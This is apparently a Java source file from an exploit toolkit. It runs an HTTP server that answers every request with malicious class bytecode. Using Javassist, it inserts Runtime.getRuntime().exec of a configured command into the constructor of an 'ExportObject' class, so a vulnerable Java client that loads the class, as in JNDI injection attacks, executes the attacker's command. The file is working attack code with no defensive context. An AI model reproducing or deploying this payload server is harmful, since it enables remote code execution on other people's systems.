

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import java.net.InetSocketAddress;
import java.util.concurrent.Executors;

import static org.apache.commons.text.StringEscapeUtils.escapeJava;

public class HttpServer implements HttpHandler {

	public static void start() throws Exception {
		System.out.println("Starting HTTP server on 0.0.0.0:" + Config.httpPort);
		com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(Config.httpPort), 10);
		httpServer.createContext("/", new HttpServer());
		httpServer.setExecutor(Executors.newCachedThreadPool());
		httpServer.start();
	}

	
	public void handle(HttpExchange httpExchange) {
		try {
			String path = httpExchange.getRequestURI().getPath();
			System.out.println("new http request from " + httpExchange.getRemoteAddress() + " asking for " + path);

			byte[] exportByteCode = patchBytecode(ExportObject.class, Config.command, "xExportObject");
			httpExchange.sendResponseHeaders(200, exportByteCode.length);
			httpExchange.getResponseBody().write(exportByteCode);
			
			httpExchange.close();
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
	
	private byte[] patchBytecode(Class clazz, String command, String newName) throws Exception {

		ClassPool classPool = ClassPool.getDefault();
		CtClass exploitClass = classPool.get(clazz.getName());

		CtConstructor m = exploitClass.getConstructors()[0];
		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
		exploitClass.setName(newName);
		exploitClass.detach();
		return exploitClass.toBytecode();
	}

}
